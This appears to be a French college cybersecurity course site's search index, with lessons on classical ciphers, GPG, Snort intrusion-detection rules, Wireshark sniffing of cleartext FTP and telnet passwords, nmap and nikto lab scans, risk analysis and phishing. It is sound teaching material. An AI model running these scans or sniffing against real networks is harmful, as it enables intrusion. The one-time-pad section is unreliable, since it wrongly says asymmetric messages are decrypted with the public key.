cl\u00e9. Disons que la cl\u00e9 est :</p> <p><code>CEGEP</code></p> <p>Le plain-texte \u00e0 chiffrer est :</p> <p><code>LE COURS EST SUPER</code></p> <p>Sous le plain-texte, il faut \u00e9crire la cl\u00e9 de chiffrement autant de fois que n\u00e9cessaire pour avoir une ligne de texte aussi longue que le plain-texte.</p> <p>Convertir chaque lettre du plain-texte en chiffre-texte : 1. Localiser la bonne colonne avec la lettre du plain-texte 2. Localiser la bonne ligne avec la lettre de la cl\u00e9 3. L'intersection est la lettre du chiffre-texte    </p> <p></p> <pre><code>LE COURS EST SUPER\nCE GEPCE GEP CEGEP\nNI ISJTW KWI UYVIG\n</code></pre> <p>Pour le d\u00e9chiffrement : 1. Localiser la bonne ligne avec la lettre de la cl\u00e9 2. Sur cette ligne, localiser la lettre du chiffre-texte 3. Aller dans le haut de la colonne pour avoir le plain-texte  </p> <p>Ex:  </p> <p>Le chiffre-texte <code>ZOHZI KST MQAEDI</code> et la cl\u00e9 <code>LUMIERE</code> </p> <p>Localiser la ligne :  </p> <p> </p> <p>Localiser la lettre :  </p> <p></p> <p>Le haut de la colonne :  </p> <p></p> <pre><code>ZOHZI KST MQAEDI\nLUMIE REL UMIERE\nOUVRE TOI SESAME\n</code></pre>"},{"location":"lecons/Cryptographie/#masque-jetable","title":"Masque jetable","text":"<p>La m\u00e9thode de substitution la plus s\u00e9curitaire est celle du masque jetable (one-time pad). C'est une cl\u00e9 al\u00e9atoire aussi longue que le texte \u00e0 chiffrer. C'est la seule m\u00e9thode de chiffrement qui est r\u00e9put\u00e9e sans faille si les r\u00e8gles suivantes sont respect\u00e9es :  </p> <ol> <li>La cl\u00e9 doit \u00eatre g\u00e9n\u00e9r\u00e9e de mani\u00e8re al\u00e9atoire</li> <li>La cl\u00e9 doit \u00eatre prot\u00e9g\u00e9e contre le vol, si un ennemi a la cl\u00e9, le message peut \u00eatre d\u00e9chiffr\u00e9</li> <li>La cl\u00e9 doit \u00eatre utilis\u00e9e qu'une seule fois. Si elle est utilis\u00e9e plus d'une fois, des experts peuvent en d\u00e9duire la cl\u00e9</li> <li>La cl\u00e9 doit \u00eatre aussi longue que le plain-texte</li> </ol> <p>Pour envoyer un message \u00e0 l'aide du chiffrement asym\u00e9trique, l'exp\u00e9diteur utilise la cl\u00e9 publique du r\u00e9ceptionnaire pour chiffrer le message, qui sera d\u00e9chiffr\u00e9 par ce dernier avec sa cl\u00e9 publique.</p> <p>Le chiffrement asym\u00e9trique peut aussi \u00eatre utilis\u00e9 comme signature \u00e9lectronique, pour prouver que le message vient vraiment de l'exp\u00e9diteur.</p> <p>Comme il n'y a pas de distribution de cl\u00e9s priv\u00e9es, il est plus facile d'utiliser ce syst\u00e8me.</p> <p>Aucun besoin de r\u00e9g\u00e9n\u00e9rer des cl\u00e9s lorsqu'un membre du groupe quitte, il n'a jamais eu acc\u00e8s aux cl\u00e9s priv\u00e9es des autres membres.</p> <p>Cependant, le chiffrement et d\u00e9chiffrement est beaucoup plus lent que pour une cl\u00e9 sym\u00e9trique.</p>"},{"location":"lecons/Cryptographie/#chiffrement-asymetrique-avec-gpg","title":"Chiffrement asym\u00e9trique avec GPG","text":"<p>GPG : GNU Privacy Guard</p> <p>GPG est install\u00e9 par d\u00e9faut dans Kali.</p> <p>GPG est utilis\u00e9 pour le chiffrement asym\u00e9trique. Pour cr\u00e9er une nouvelle cl\u00e9 :</p> <p><code>gpg --gen-key</code></p> <p>Pour exporter une cl\u00e9 publique dans un format lisible :</p> <p><code>gpg --output cle.pgp --armor --export rivard.etienne@cegepvicto.ca</code></p> <p>\u00c7a donne ceci :</p> <pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nmDMEaFxJZRYJKwYBBAHaRw8BAQdAmFAij9pipye6a3mPr0U/aiL453+pzwnbMdTW\nYPpDy7i0LUV0aWVubmUgUml2YXJkIDxyaXZhcmQuZXRpZW5uZUBjZWdlcHZpY3Rv\nLmNhPoiZBBMWCgBBFiEEaRbztuZd3HN94zs8j65vkZqQVG0FAmhcSWUCGwMFCQWj\nmoAFCwkIBwICIgIGFQoJCAsCBBYCAwECHgcCF4AACgkQj65vkZqQVG3t/wD9HWtE\nwyuBKdhNHzLBujdIyshKifHCnjL3LNY55cW+IUMA/RNfIpcXC9X+0tE3xa8H7uRI\nfyznmsIY5/2vna5Z9XYLuDgEaFxJZRIKKwYBBAGXVQEFAQEHQM9o0rfE9v71WZCF\nb6+QdgY3W+dmEXbVq7iyp7d9TiAUAwEIB4h+BBgWCgAmFiEEaRbztuZd3HN94zs8\nj65vkZqQVG0FAmhcSWUCGwwFCQWjmoAACgkQj65vkZqQVG3towEAqSbYvjg/vDri\nDN4M6LbxZkch+ZkySiMoFPM/M2JbWrUBAIpiXhxqMUmfowGghRdt7yKpm8xf3ttX\na6jeWLv2rTEC\n=1gpo\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre> <p>Pour importer la cl\u00e9 publique du futur r\u00e9cipiendaire de vos messages :</p> <p><code>gpg --import cle.gpg</code></p> <p>Pour chiffrer votre message :</p> <p><code>gpg --output chiffre-texte.gpg --encrypt --recipient destinataire@email.com plain-texte</code></p> <p>Le r\u00e9cipiendaire pourra d\u00e9chiffrer le message comme suit :</p> <p><code>gpg --output plain-texte --decrypt chiffre-texte.gpg</code></p>"},{"location":"lecons/Cryptographie/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur le chiffrement </p>"},{"location":"lecons/Detection_intrusion/","title":"D\u00e9tection d'intrusion","text":"<p>Pour bien prot\u00e9ger un r\u00e9seau d'entreprise, il est important d'avoir une visibilit\u00e9 sur les activit\u00e9s dans ce r\u00e9seau.</p> <p>Des syst\u00e8mes nomm\u00e9s IDS (Intrusion Detection System) \u00e9coutent toutes les communications d'un r\u00e9seau et lancent une alerte lorsqu'une activit\u00e9 suspecte survient.</p> <p>D'autres syst\u00e8mes sont plus avanc\u00e9s et permettent de pr\u00e9venir une intrusion d\u00e8s qu'une attaque est d\u00e9tect\u00e9e, les IPS (Intrusion Prevention System). Les IPS sont normalement connect\u00e9s au pare-feu ou au commutateur r\u00e9seau pour terminer les communications jug\u00e9es suspectes.</p> <p>Principalement, un IDS \u00e9coute le r\u00e9seau comme le fait Wireshark. Il peut d\u00e9tecter une attaque de deux fa\u00e7ons :</p> <ol> <li>Selon un ensemble de r\u00e8gles,</li> <li>Selon une d\u00e9tection de comportement.</li> </ol> <p>La d\u00e9tection par r\u00e8gles implique que l'op\u00e9rateur du IDS \u00e9crit chaque r\u00e8gle qu'il veut d\u00e9tecter. Ce peut \u00eatre par exemple pour d\u00e9tecter un syst\u00e8me qui fait un ICMP ping (lors de la reconnaissance active) ou l'utilisation de services sp\u00e9cifiques.</p> <p>La d\u00e9tection par comportement implique un moteur intelligent qui apprend ce que les syst\u00e8mes font normalement et r\u00e9agit lorsque ces syst\u00e8mes agissent diff\u00e9remment. Ex :</p> <p>Un poste de travail acc\u00e8de \u00e0 des fichiers sur le serveur (service SMB, port 445) \u00e0 chaque jour. Un jour, ce poste essaie de se connecter en SSH, puis en Telnet. Comme ce n'est pas usuel, l'IDS identifierait le poste comme suspicieux.</p>"},{"location":"lecons/Detection_intrusion/#snort","title":"Snort","text":"<p>Snort est un IDS/IPS Open-Source tr\u00e8s populaire sur le march\u00e9. Il fonctionne selon un ensemble de r\u00e8gles.</p> <p>Le fichier de configuration se trouve ici :  </p> <p><code>/etc/snort/snort.conf</code></p> <p></p> <p>Il est important que l'adresse HOME_NET corresponde \u00e0 l'adresse de votre serveur. Pour trouver l'adresse de votre serveur :  </p> <p><code>ip addr</code></p> <p></p> <p>Pour tester la configuration, utilisez la commande suivante :  </p> <p><code>snort -T -c /etc/snort/snort.conf</code></p>"},{"location":"lecons/Detection_intrusion/#pour-demarrer-snort","title":"Pour d\u00e9marrer Snort","text":"<p><code>snort -A console -i enp0s7 -u snort -g snort -c /etc/snort/snort.conf</code> . </p> <p>Truc: Cr\u00e9ez un fichier bash avec la commande! (dans mon cas c'est <code>startsnort</code>)   </p>"},{"location":"lecons/Detection_intrusion/#regles-de-snort","title":"R\u00e8gles de snort","text":"<p>Snort fonctionne avec des r\u00e8gles. Les r\u00e8gles sont ajout\u00e9es au fichier <code>/etc/snort/rules/local.rules</code>. Par d\u00e9faut, le fichier est vide.</p> <p>\u00c9crivons notre premi\u00e8re r\u00e8gle :  </p> <p><code>alert icmp any any -&gt; any any (msg:\"Test ICMP\"; sid:10000001; rev:001;)</code></p> <p>Voici la structure de la r\u00e8gle :  </p> <p></p>"},{"location":"lecons/Detection_intrusion/#actions","title":"Actions","text":"<p>Voici les actions possibles avec Snort :  </p> <ol> <li>alert - g\u00e9n\u00e8re une alerte et \u00e9crit le paquet dans l'historique  </li> <li>log - \u00e9crit le paquet dans l'historique  </li> <li>pass - ignore le paquet  </li> <li>drop - bloque et \u00e9crit le paquet dans l'historique  </li> <li>reject - bloque le paquet, \u00e9crit le paquet dans l'historique et envoi un TCP reset  </li> <li>sdrop - bloque le paquet sans l'\u00e9crire dans l'historique  </li> </ol>"},{"location":"lecons/Detection_intrusion/#protocoles","title":"Protocoles","text":"<p>Il y a 4 protocoles disponibles avec Snort : TCP, UDP, ICMP et IP.  </p>"},{"location":"lecons/Detection_intrusion/#adresses","title":"Adresses","text":"<p>Les adresses sont sous le format CIDR :  </p> CIDR Plage 192.168.40.0/24 192.168.40.1 \u00e0 192.168.40.255 192.168.40.5/32 192.168.40.5 seulement any n'importe quelle adresse IP <p>Pour exclure une plage d'adresses, utiliser le ! comme ceci :  </p> <p><code>!192.168.40.0/24</code>  veut dire toutes les adresses sauf celles entre 192.168.40.1 et 192.168.40.255.</p>"},{"location":"lecons/Detection_intrusion/#ports","title":"Ports","text":"<p>Vous pouvez sp\u00e9cifier les ports de la mani\u00e8re suivante :  </p> Ports Plage any n'importe quel port 21 seulement le port 21 1:1000 tous les ports entre 1 et 1000 1000: tous les ports plus grand ou \u00e9gal \u00e0 1000 :500 tous les ports plus petit ou \u00e9gal \u00e0 500 !21 tous les ports sauf le port 21"},{"location":"lecons/Detection_intrusion/#la-direction","title":"La direction","text":"<p>Vous pouvez sp\u00e9cifier la direction de la mani\u00e8re suivante :  </p> Direction Signification -&gt; communication de l'adresse source vers l'adresse de destination &lt;&gt; communication de l'adresse source vers l'adresse de destination et la communication de la destination vers la source <p>Astuce : La direction &lt;&gt; peut \u00eatre utile pour conserver la conversation entre deux adresses, par exemple une conversation telnet :  </p> <p><code>log tcp 192.168.40.0/24 any &lt;&gt; 192.168.40.0/24 23</code></p>"},{"location":"lecons/Detection_intrusion/#options","title":"Options","text":"<p>Il y a 4 cat\u00e9gories d'options aux r\u00e8gles :  </p> Cat\u00e9gorie Description general Information \u00e0 propos de la r\u00e8gle, aucun effet durant la d\u00e9tection payload Inspecte le contenu d'un paquet non-payload Inspecte les informations du paquet autre que le contenu post-detection D\u00e9clencheurs qui surviennent apr\u00e8s ex\u00e9cution de la r\u00e8gle"},{"location":"lecons/Detection_intrusion/#options-generales","title":"Options g\u00e9n\u00e9rales","text":"Option Description Exemple msg Imprime un message en m\u00eame temps que le d\u00e9tail du paquet <code>log tcp any any -&gt; any 21 (msg:\"Utilisation de FTP\";)</code> sid Pour identifier de mani\u00e8re unique une r\u00e8gle. Utiliser &gt; 1 000 000 pour vos r\u00e8gles locales <code>log tcp any any -&gt; any 21 (sid:1000002;)</code>"},{"location":"lecons/Detection_intrusion/#options-payload","title":"Options payload","text":"Option Description Exemple content Examine le contenu du paquet <code>log tcp any any -&gt; any 80 (content:\"GET\"; msg:\"Utilisation de HTTP\";)</code> pcre Examine le contenu du paquet avec un regex <code>log tcp any any -&gt; any 21 (pcre:\"/user\\s+root/i\"; msg:\"Utilisation de FTP avec user root\";)</code>"},{"location":"lecons/Detection_intrusion/#options-non-payload","title":"Options non-payload","text":"Option Description Exemple ttl Examine le time to live <code>log ip any any -&gt; any any (ttl:&lt;3; sid:100000001;)</code> flags Examine quel s\u00e9maphore est allum\u00e9 <code>log ip any any -&gt; any any (flags:SF; sid:100000001;)</code>"},{"location":"lecons/Detection_intrusion/#options-post-detection","title":"Options post-detection","text":"Option Description Exemple session \u00c9crit dans l'historique le contenu de la session <code>log tcp any any -&gt; any 23 (session:printable; sid:100000001;)</code> detection_filter D\u00e9finit le nombre d'occurence avant de d\u00e9clencher une alerte <code>alert icmp any any -&gt; any any (detection_filter:track by_src, count 30, seconds 60;sid:100000001;)</code>"},{"location":"lecons/Detection_intrusion/#fichier-dhistorique","title":"Fichier d'historique","text":"<p>Les fichiers d'historique se trouvent dans le r\u00e9pertoire suivant :  </p> <p><code>/var/log/snort</code></p> <p>Pour visualiser l'historique (qui est en fait un fichier pcap), deux choix :  </p> <ol> <li>utiliser la commande <code>snort -r &lt;nom fichier&gt;</code></li> <li>Transf\u00e9rer le fichier dans Wireshark</li> </ol>"},{"location":"lecons/Detection_intrusion/#quelques-trucs","title":"Quelques trucs","text":"<ol> <li>N'activer les r\u00e8gles que pour l'\u00e9quipement que vous voulez prot\u00e9ger. Pas de serveur Web? n'activez pas les r\u00e8gles qui les concernent</li> <li>\u00c9crire les r\u00e8gles qui attaquent une vuln\u00e9rabilit\u00e9, pas pour d\u00e9tecter un payload. Les pirates peuvent changer la signature du payload, mais pas celle de la vuln\u00e9rabilit\u00e9.</li> </ol>"},{"location":"lecons/Detection_intrusion/#quelques-regles","title":"Quelques r\u00e8gles","text":""},{"location":"lecons/Detection_intrusion/#detecter-un-scan-nmap-des-ports-tcp-dun-serveur","title":"D\u00e9tecter un scan NMAP des ports TCP d'un serveur.","text":"<p><code>alert tcp any any -&gt; any any (flags:S; detection_filter:track by_src, count 1000, seconds 60; msg:\"NMAP Syn Scan\"; sid:1000001;)</code></p> <p>Testons la r\u00e8gle :</p> <p></p> <p>La r\u00e9action de snort :  </p> <p></p>"},{"location":"lecons/Detection_intrusion/#detecter-un-essai-de-se-connecter-en-ftp-avec-root","title":"D\u00e9tecter un essai de se connecter en FTP avec root","text":"<pre><code>alert tcp any any -&gt; any 21 ( \\\n  pcre:\"/user\\s+root/i\"; \\\n  sid: 1000002; \\\n  msg:\"Utilisation de FTP avec user root\";)\n</code></pre> <p>Testons la r\u00e8gle :  </p> <p></p> <p>La r\u00e9action de snort :  </p> <p></p>"},{"location":"lecons/Detection_intrusion/#detecter-un-login-de-telnet-invalide","title":"D\u00e9tecter un login de telnet invalide","text":"<pre><code>alert tcp any 23 -&gt; any any ( \\\n  content:\"Login incorrect\"; \\\n  sid: 1000003; \\\n  msg:\"Essai de login TELNET invalide\";)\n</code></pre> <p>Testons la r\u00e8gle :  </p> <p></p> <p>La r\u00e9action de snort :  </p> <p></p>"},{"location":"lecons/Detection_intrusion/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz de la d\u00e9tection d'intrusion </p>"},{"location":"lecons/Ecoute_reseau/","title":"\u00c9coute du r\u00e9seau avec Wireshark","text":"<p>Wireshark est un analyseur de protocole r\u00e9seau. Avec cet outil, nous pouvons collecter tous les paquets IP qui se transigent sur le r\u00e9seau.</p> <p>Dans notre laboratoire, Wireshark sera utilis\u00e9 dans Kali. Normalement, VirtualBox g\u00e8re le r\u00e9seau comme un commutateur. Le trafic r\u00e9seau entre 2 machines ne peut pas \u00eatre vu par une 3\u00e8me machine.</p> <p>Ex:</p> <p>Machine A : Windows XP Machine B : Metasploitable Machine C : Kali  </p> <p>Quand la machine A communique avec la machine B, seulement la machine A et la machine B voient les paquets. Ceux-ci sont invisibles pour la machine C.</p> <p>Il y a cependant une mani\u00e8re de contourner ceci, pour que Kali puisse voir le trafic des autres VM. C'est le mode promiscuous.</p> <p>Dans les configurations de la VM Kali, dans la section Network, changez le Promiscuous Mode_ \u00e0 Allow All</p> <p></p>"},{"location":"lecons/Ecoute_reseau/#demarrer-une-ecoute-du-reseau","title":"D\u00e9marrer une \u00e9coute du r\u00e9seau","text":"<p>\u00c9cran principal de Wireshark</p> <p></p> <p>Pour d\u00e9marrer l'\u00e9coute, double-cliquez sur eth0.</p> <p> 1. Interface de filtre 2. Liste des paquets transmis  </p> <p>Avant d'aller plus loin, disons que nous sommes all\u00e9s sur la page principale de Google.</p>"},{"location":"lecons/Ecoute_reseau/#filtres","title":"Filtres","text":"<p>Une des premi\u00e8res choses qu'un ordinateur fait lorsque nous voulons acc\u00e9der \u00e0 une page Web et de faire un requ\u00eate au serveur DNS.</p> <p>Recherchons les paquets DNS dans notre capture</p> <p></p> <p>Regardez les deux premi\u00e8res entr\u00e9es :</p> <p>La premi\u00e8re montre notre ordinateur (192.168.40.4) fait une demande de requ\u00eate DNS au serveur DNS (192.168.2.1). La seconde entr\u00e9e montre la r\u00e9ponse du serveur DNS \u00e0 notre ordinateur.</p> <p>Pour trouver la r\u00e9ponse sp\u00e9cifique \u00e0 une requ\u00eate, on peut activer un filtre en quelques \u00e9tapes</p> <p> 1. Cliquer sur la transaction dns 2. Dans la section Domain Name System (query), faire un clic droit sur l'item transaction id 3. S\u00e9lectionner le menu Prepare as filter 4. S\u00e9lectionner le menu S\u00e9lectionn\u00e9  </p> <p>Ce que \u00e7a donne est le filtre <code>dns.id==&lt;id_transaction&gt;</code></p> <p>Il est aussi possible de l'inscrire manuellement</p> <p></p> <p>Pour voir les paquets qui sont re\u00e7us du serveur de Google, appliquons un diff\u00e9rent filtre</p> <p><code>ip.src == 172.217.13.195</code> </p> <p>Pour voir les paquets envoy\u00e9s ET re\u00e7us du serveur de Google</p> <p><code>ip.src == 172.217.13.195 or ip.dst == 172.217.13.195</code> </p> <p>Prendre note des 3 premi\u00e8res transactions avec le protocole TCP. On peut y voir clairement la connexion en trois \u00e9tapes de TCP entre les deux intervenants.</p> <p>\u00c0 noter que <code>ip.addr == 172.217.13.195</code> est \u00e9quivalent \u00e0 <code>ip.src == 172.217.13.195 or ip.dst == 172.217.13.195</code></p> <p>Autres recherches possibles :</p> <p><code>tcp.port == 443</code> <code>data-text-lines contains \"twiki\"</code> <code>http.request.method == \"GET\"</code> </p>"},{"location":"lecons/Ecoute_reseau/#nmap","title":"nmap","text":"<p>Qu'arrive-t'il lorsque nous utilisons la commande nmap?</p> <p>Ex\u00e9cutons la commande suivante :</p> <p><code>sudo nmap -sS T4 192.168.40.7</code></p> <p>R\u00e9sultat de nmap dans Wireshark</p> <p> Disons que ce n'est pas discret!!!</p>"},{"location":"lecons/Ecoute_reseau/#nikto","title":"Nikto","text":"<p>Qu'arrive-t'il lorsque nous utilisons la commande nikto?</p> <p>Ex\u00e9cutons la commande suivante :</p> <p><code>nikto -h 192.168.40.7</code></p> <p>R\u00e9sultats de nikto dans Wireshark</p> <p> Impossible de passer inaper\u00e7u!</p>"},{"location":"lecons/Ecoute_reseau/#protocoles-insecures","title":"Protocoles ins\u00e9cures","text":"<p>Wireshark peut nous aider \u00e0 espionner les victimes lorsqu'ils utilisent des protocoles non s\u00e9curitaires.</p>"},{"location":"lecons/Ecoute_reseau/#ftp","title":"FTP","text":"<p>Voici la transaction ftp</p> <p></p> <p>R\u00e9sultat de ftp dans Wireshark</p> <p> Avez-vous trouv\u00e9 le mot de passe utilis\u00e9?</p>"},{"location":"lecons/Ecoute_reseau/#telnet","title":"Telnet","text":"<p>Voici la transaction telnet</p> <p></p> <p>R\u00e9sultat de telnet dans Wireshark</p> <p> Ce n'est pas tr\u00e8s facile de voir ce qui se passe. Telnet envoie les touches appuy\u00e9es une par une...</p> <p>Une fonctionnalit\u00e9 de Wireshark est de recueillir la communication ou conversation avec sa fonction suivre le flux</p> <p></p> <p>R\u00e9sultat de suivre le flux</p> <p></p>"},{"location":"lecons/Ecoute_reseau/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur l'\u00e9coute du r\u00e9seau </p>"},{"location":"lecons/Gestion_de_risques/","title":"Gestion de risques","text":""},{"location":"lecons/Gestion_de_risques/#definitions-des-termes-les-plus-importants","title":"D\u00e9finitions des termes les plus importants","text":"<p>Actif (asset) : N'importe quoi dans un environnement qui doit \u00eatre prot\u00e9g\u00e9. N'importe quoi qui peut \u00eatre utilis\u00e9 dans une t\u00e2che ou un processus d'affaires. Ce peut \u00eatre un fichier, un service r\u00e9seau, un programme, un produit, une infrastructure TI, une base de donn\u00e9es, du mat\u00e9riel informatique, un syst\u00e8me d'exploitation, etc. Si l'entreprise y voit une valeur assez importante pour la prot\u00e9ger, c'est un actif.</p> <p>Valeur d'un actif (asset valuation) : Valeur mon\u00e9taire assign\u00e9e \u00e0 un actif. Cela inclus le co\u00fbt direct d'achat et les co\u00fbts associ\u00e9s non-mon\u00e9taires. Les autres co\u00fbts peuvent \u00eatre le d\u00e9veloppement, le maintien et le support.</p> <p>Menace (threat) : Une menace est une occurence qui peut causer d\u00e9nouement non d\u00e9sirable pour une organisation. Une menace peut \u00eatre toute action ou inaction qui peut causer du dommage, de la destruction, une modification, une perte, une fuite d'information ou qui peut emp\u00eacher l'utilisation d'un actif. Ce peut \u00eatre accidentel ou intentionnel. Une menace peut venir d'une personne, une organisation, du mat\u00e9riel, de r\u00e9seaux ou m\u00eame de la nature. Ce peut \u00eatre un pirate, un employ\u00e9, un tremblement de terre ou un feu, par exemple.</p> <p>Vuln\u00e9rabilit\u00e9 (vulnerability) : Une vuln\u00e9rabilit\u00e9 est une faille ou une faiblesse dans un actif ou l'absence de pr\u00e9cautions ou de contremesures.</p> <p>Exposition (exposure) : L'exposition est \u00eatre susceptible \u00e0 une perte d'un actif d\u00fb \u00e0 d'une menace. Il y a une possibilit\u00e9 que l'actif soit vuln\u00e9rable ou qu'il puisse \u00eatre exploit\u00e9 par une personne mena\u00e7ante.</p> <p>Risque (risk) : Le risque est la possibilit\u00e9 qu'une menace exploite une vuln\u00e9rabilit\u00e9 pour causer du tort \u00e0 un actif. C'est une \u00e9valuation de probabilit\u00e9 d'occurence, de possibilit\u00e9 ou de chance. Plus il y a de chance qu'un menace se concr\u00e9tise, plus le risque est grand. La formule suivante repr\u00e9sente bien le risque :</p> <p><code>risque = menace * vuln\u00e9rabilit\u00e9</code></p> <p>Dans ce sens, r\u00e9duire la menace ou la vuln\u00e9rabilit\u00e9 r\u00e9duit le risque.</p> <p>Mesure de protection (safeguard) : Une mesure de protection est n'importe quoi qui enl\u00e8ve ou r\u00e9duit une vuln\u00e9rabilit\u00e9 ou prot\u00e8ge d'une menace. Ce peut \u00eatre l'installation de rustine (patch), la configuration de syst\u00e8mes, l'embauche de gardes de s\u00e9curit\u00e9, installer un pare-feu, etc. Ce n'est pas n\u00e9cessaire de faire l'achat d'\u00e9quipement ou de logiciel pour \u00eatre consid\u00e9r\u00e9 une mesure, parfois une simple reconfiguration on un retrait d'actif est suffisant.</p> <p>Attaque (attack) : Une attaque est l'exploitation d'une vuln\u00e9rabilit\u00e9 par une personne mena\u00e7ante. C'est une utilisation d\u00e9lib\u00e9r\u00e9e d'une vuln\u00e9rabilit\u00e9 pour causer des dommages \u00e0 l'entreprise.</p> <p>Intrusion (breach) : Une intrusion est une personne mena\u00e7ante qui contourne un m\u00e9canisme de s\u00e9curit\u00e9. Quand une intrusion est combin\u00e9e \u00e0 une attaque, on appelle \u00e7a une p\u00e9n\u00e9tration.</p>"},{"location":"lecons/Gestion_de_risques/#identifier-les-menaces-et-vulnerabilites","title":"Identifier les menaces et vuln\u00e9rabilit\u00e9s","text":"<p>Il faut consid\u00e9rer les \u00e9l\u00e9ments suivants lors de l'identification de menaces et vuln\u00e9rabilit\u00e9s :</p> <ul> <li>Les virus</li> <li>Activit\u00e9s criminelles par des utilisateurs autoris\u00e9s</li> <li>Mouvement (vibration, secousses, etc.)</li> <li>Attaques intentionnelles</li> <li>R\u00e9organisations</li> <li>\u00c9pid\u00e9mies et pand\u00e9mies</li> <li>Pirates malicieux</li> <li>Employ\u00e9s frustr\u00e9s</li> <li>Erreurs par les utilisateurs</li> <li>D\u00e9sastres naturels (tremblement de terre, inondations, feux, volcans, tornades, etc.)</li> <li>Dommages physiques (\u00e9craser, coupure de c\u00e2bles, etc.)</li> <li>Mauvaise utilisation de donn\u00e9es, ressources ou services</li> <li>Erreurs de processus, d\u00e9passement de pile</li> <li>Abus de privil\u00e8ges par les employ\u00e9s</li> <li>Temp\u00e9ratures extr\u00eames</li> <li>Fluctuation \u00e9nerg\u00e9tiques</li> <li>Perte de donn\u00e9es</li> <li>Erreurs de programmation</li> <li>Intrus</li> <li>Faille d'\u00e9quipement</li> <li>Vol physique</li> <li>Ing\u00e9nierie sociale</li> </ul>"},{"location":"lecons/Gestion_de_risques/#evaluation-des-risques","title":"\u00c9valuation des risques","text":"<p>Premi\u00e8re chose : il est impossible d'\u00e9liminer \u00e0 100% les risques</p> <p>Seconde chose : L'entreprise peut choisir d'accepter le risque au lieu de le r\u00e9duire.</p>"},{"location":"lecons/Gestion_de_risques/#analyse-de-risques-quantitative","title":"Analyse de risques quantitative","text":"<p>L'analyse de risques quantitative est la m\u00e9thode qui offre des pourcentages de probabilit\u00e9s concrets. \u00c7a veut dire que nous pouvons assigner une valeur mon\u00e9taire au risque, \u00e0 la perte potentielle et aux co\u00fbts de protection. Cependant, ce n'est pas tous les risques qui peuvent \u00eatre \u00e9valu\u00e9s de mani\u00e8re quantitative.</p> <p>Voici les 6 \u00e9tapes de l'analyse de risques quantitative : 1. D\u00e9terminer la valeur de l'actif : AV (Asset Value) 2. Produire une liste de menaces pour chaque actif, calculer le facteur d'exposition EF (Exposure Factor) et la perte pr\u00e9vue unique SLE (Single Loss Expectancy) 3. Faire l'analyse des menaces pour calculer la probabilit\u00e9 de se produire dans une ann\u00e9e, ce qu'on appelle la fr\u00e9quence annualis\u00e9e d'occurence ARO (Annualised Rate of Occurence) 4. Calculer le potentiel de perte par menace en calculant la perte pr\u00e9vue annualis\u00e9e ALE (Annualised Loss Expectency) 5. Rechercher les mesures de protection et calculer les ARO et ALE bas\u00e9 sur ces mesures. 6. Faire une analyse de co\u00fbts et b\u00e9n\u00e9fices pour chaque mesure. S\u00e9lectionner la mesure la plus appropri\u00e9e  </p> <p>Ex: Vous avez achet\u00e9 une voiture pour 1 500$. Votre assureur vous donne le choix d'une assurance de base \u00e0 500$ par ann\u00e9e ou une assurance \"valeur \u00e0 neuf\" pour 1 000$ par ann\u00e9e, avec un d\u00e9ductible de 300$. En 5 ans de conduite, vous n'avez fait qu'un accident mineur avec des dommages de moins de 500$. Un accident pourrait diminuer de 40% la valeur de votre voiture.</p> Variable Formule Valeur AV $ 1 500$ EF % 40% SLE SLE = AV * EF 1 500$ * 40% = 600$ ARO # / ann\u00e9e 1 / 5 = 20% (1 fois au 5 ans) ALE ALE = SLE * ARO 600$ * 20% = 120$ <p>Donc, votre risque d'accident vaut 120$ par ann\u00e9e. Croyez-vous que payer un surplus de 500$ par ann\u00e9e \u00e0 votre assurance vaut la peine?</p>"},{"location":"lecons/Gestion_de_risques/#analyse-de-risques-qualitative","title":"Analyse de risques qualitative","text":"<p>Une analyste de risques qualitative est bas\u00e9e sur des sc\u00e9narios. C'est bas\u00e9 sur des \u00e9chelles pour \u00e9valuer les risques, co\u00fbts et effets. Nous faisons surtout appel \u00e0 votre jugement, intuition et exp\u00e9rience.</p> <p>Par exemple, pour les risques reli\u00e9s \u00e0 un centre de donn\u00e9es :</p> Risque Probabilit\u00e9 Co\u00fbts Feu 3 - Moyen $$$ Tremblement de terre 4 - Faible $$ \u00c9ruption volcanique 5 - Tr\u00e8s faible $$$ <p>Dans cet exemple, il est plus important de r\u00e9duire les risques de feu.</p>"},{"location":"lecons/Gestion_de_risques/#reponses-aux-risques","title":"R\u00e9ponses aux risques","text":"<p>L'entreprise peut r\u00e9pondre de plusieurs mani\u00e8res aux risques.</p>"},{"location":"lecons/Gestion_de_risques/#attenuation-du-risque","title":"Att\u00e9nuation du risque","text":"<p>Att\u00e9nuer ou r\u00e9duire le risque est l'application de mesures de protection pour \u00e9liminer les vuln\u00e9rabilit\u00e9s ou bloquer les menaces.</p>"},{"location":"lecons/Gestion_de_risques/#transfert-du-risque","title":"Transfert du risque","text":"<p>Transf\u00e9rer le risque est le placement du co\u00fbt de la perte chez une autre entit\u00e9. Par exemple, acheter une assurance contre le feu est un transfert de risque vers la compagnie d'assurance.</p>"},{"location":"lecons/Gestion_de_risques/#accepter-le-risque","title":"Accepter le risque","text":"<p>Dans certains cas, l'entreprise d\u00e9cide d'accepter de vivre avec le risque et les pertes potentielles au lieu d'investir dans une solution d'att\u00e9nuation ou de transfert du risque.</p> <p>Aussi appel\u00e9 l'app\u00e9tit pour le risque.</p>"},{"location":"lecons/Gestion_de_risques/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la gestion de risques </p>"},{"location":"lecons/Hameconnage/","title":"Hame\u00e7onnage","text":""},{"location":"lecons/Hameconnage/#definition","title":"D\u00e9finition","text":"<p>L\u2019hame\u00e7onnage est une forme de fraude par laquelle des personnes malintentionn\u00e9es utilisent de faux courriels, textos ou appels pour amener des utilisateurs \u00e0 divulguer des renseignements sensibles ou \u00e0 t\u00e9l\u00e9charger un logiciel malveillant.  </p>"},{"location":"lecons/Hameconnage/#cas-reel-de-fraude-par-hameconnage-vecu-au-cegep-de-victoriaville","title":"Cas r\u00e9el de fraude par hame\u00e7onnage, v\u00e9cu au C\u00e9gep de Victoriaville","text":""},{"location":"lecons/Hameconnage/#comment-detecter-un-courriel-dhameconnage","title":"Comment d\u00e9tecter un courriel d'hame\u00e7onnage","text":"<ol> <li>L'adresse de courriel n'est pas exactement celle d'un utilisateur normal. Dans le cas pr\u00e9sent le domaine a un L au lieu d'un I ce qui fait vlctoriaville au lieu de victoriaville.  </li> <li>Le courriel vient de 